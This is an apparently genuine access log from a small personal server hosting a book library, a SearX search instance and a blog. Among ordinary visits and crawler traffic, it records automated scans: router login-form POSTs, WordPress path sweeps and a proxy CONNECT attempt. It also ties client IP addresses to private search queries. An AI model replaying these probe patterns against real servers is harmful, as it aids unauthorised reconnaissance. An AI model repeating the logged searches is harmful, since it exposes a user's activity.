92.184.108.227 - - [09/Apr/2023:13:16:14 +0000] "GET /get/thumb/44/books?sz=900x1200 HTTP/1.1" 304 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:14 +0000] "GET /get/thumb/43/books?sz=900x1200 HTTP/1.1" 304 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:14 +0000] "GET /get/thumb/45/books?sz=900x1200 HTTP/1.1" 304 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:14 +0000] "GET /get/thumb/41/books?sz=900x1200 HTTP/1.1" 304 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:14 +0000] "GET /get/thumb/27/books?sz=900x1200 HTTP/1.1" 304 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:14 +0000] "GET /get/thumb/31/books?sz=900x1200 HTTP/1.1" 304 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:14 +0000] "GET /get/thumb/38/books?sz=900x1200 HTTP/1.1" 304 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:15 +0000] "GET /get/cover/82/books HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:15 +0000] "GET /get/cover/82/books HTTP/1.1" 304 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:22 +0000] "GET /get/PDF/82/books HTTP/1.1" 401 0 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:23 +0000] "GET /get/PDF/82/books HTTP/1.1" 200 1884278 "http://208.76.222.31/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:23 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.184.108.227 - - [09/Apr/2023:13:16:27 +0000] "GET /favicon.ico HTTP/1.1" 404 0 "-" "com.apple.WebKit.Networking/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0"
92.184.108.227 - - [09/Apr/2023:13:16:27 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 0 "-" "com.apple.WebKit.Networking/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0"
92.184.108.227 - - [09/Apr/2023:13:16:27 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 15195 "-" "com.apple.WebKit.Networking/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0"
103.108.229.75 - - [09/Apr/2023:13:22:51 +0000] "GET / HTTP/1.1" 404 125 "-" "Go-http-client/1.1"
143.110.222.166 - - [09/Apr/2023:13:24:57 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
207.46.13.223 - - [09/Apr/2023:13:46:32 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.90 - - [09/Apr/2023:13:52:43 +0000] "GET / HTTP/1.1" 200 605 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.92 - - [09/Apr/2023:13:59:43 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
193.32.162.159 - - [09/Apr/2023:14:06:58 +0000] "GET / HTTP/1.1" 200 415764 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [09/Apr/2023:14:07:08 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
138.128.244.159 - - [09/Apr/2023:14:09:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 0 "http://208.76.222.31:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
138.128.244.159 - - [09/Apr/2023:14:09:27 +0000] "" 400 0 "-" "-"
154.209.125.60 - - [09/Apr/2023:14:27:17 +0000] "GET / HTTP/1.1" 200 5190 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
154.209.125.115 - - [09/Apr/2023:14:27:19 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
143.110.222.166 - - [09/Apr/2023:14:27:59 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
43.156.71.151 - - [09/Apr/2023:14:33:12 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:15 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:17 +0000] "GET /feed/ HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:18 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:18 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:19 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:20 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:21 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:22 +0000] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:23 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:24 +0000] "GET /2021/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:25 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:26 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:27 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:27 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:28 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
43.156.71.151 - - [09/Apr/2023:14:33:29 +0000] "" 400 0 "-" "-"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:14:44:24 +0000] "GET /searx/search?q=crous%20etudiants%20culturel HTTP/1.1" 200 7598 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:14:44:25 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:14:44:25 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 200 17731 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:14:44:25 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 200 1457 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:14:44:25 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 200 45062 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:14:44:25 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 200 39680 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:14:44:25 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 200 6370 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:14:44:25 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 200 89501 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:14:44:25 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
167.88.61.141 - - [09/Apr/2023:14:47:02 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 0 "http://208.76.222.31:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
167.88.61.141 - - [09/Apr/2023:14:47:02 +0000] "" 400 0 "-" "-"
172.104.11.34 - - [09/Apr/2023:14:48:03 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xD0*\xEC\xC6\xB7\xB142\xB6\xBFr\xDA\xAE\x19O\xB7\xB1k\x8A\x0B8\xEF\xC0\xA5s~\xFC\xE8\xB2[n\xDB\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
157.55.39.211 - - [09/Apr/2023:14:50:34 +0000] "GET / HTTP/1.1" 200 1029 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
143.110.222.166 - - [09/Apr/2023:15:24:46 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:15:25:10 +0000] "GET /searx/search?q=know%20b4%20careers HTTP/1.1" 200 7540 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:15:25:10 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:15:25:10 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 200 17731 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:15:25:10 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 200 1457 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:15:25:10 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 200 89501 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:15:25:10 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 200 39680 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:15:25:10 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 200 6370 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:15:25:10 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 200 45062 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:15:25:10 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
52.167.144.92 - - [09/Apr/2023:15:32:02 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
2620:96:e000:b0cc:e:2:7:7 - - [09/Apr/2023:15:35:06 +0000] "GET / HTTP/1.1" 200 5190 "-" "-"
2620:96:e000:b0cc:e:2:7:7 - - [09/Apr/2023:15:35:06 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:7:7 - - [09/Apr/2023:15:35:06 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
2620:96:e000:b0cc:e:2:7:7 - - [09/Apr/2023:15:35:07 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
176.113.115.51 - - [09/Apr/2023:15:38:50 +0000] "GET /api/v1" 404 153 "-" "-"
40.77.167.232 - - [09/Apr/2023:15:39:22 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
52.167.144.117 - - [09/Apr/2023:15:45:40 +0000] "GET / HTTP/1.1" 200 587 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
179.43.177.242 - - [09/Apr/2023:15:52:38 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 0 "http://208.76.222.31:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
179.43.177.242 - - [09/Apr/2023:15:52:39 +0000] "" 400 0 "-" "-"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:29 +0000] "GET /searx/search?q=bari HTTP/1.1" 200 7795 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:29 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:29 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 200 1457 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:29 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 200 17731 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:29 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 200 45062 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:29 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 200 39680 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:29 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 200 6370 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:29 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 200 89501 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:29 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:33 +0000] "POST /searx/search HTTP/1.1" 200 18972 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:33 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:33 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:33 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:33 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:33 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:33 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:33 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb1a:401d:9704:b861:b7d0:454a:128d - - [09/Apr/2023:16:22:33 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
62.171.175.68 - - [09/Apr/2023:16:24:38 +0000] "CONNECT 84.153.75.193:4444 HTTP/1.1" 400 157 "-" "-"
51.222.253.8 - - [09/Apr/2023:16:24:44 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.50 - - [09/Apr/2023:16:24:46 +0000] "GET /posts/another-daria-thing/another-daria-thing.html HTTP/1.1" 200 2282 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
143.110.222.166 - - [09/Apr/2023:16:25:05 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
198.235.24.177 - - [09/Apr/2023:16:25:47 +0000] "GET / HTTP/1.1" 301 169 "-" "-"
198.235.24.177 - - [09/Apr/2023:16:25:48 +0000] "GET / HTTP/1.1" 200 5937 "http://208.76.222.31:80/" "-"
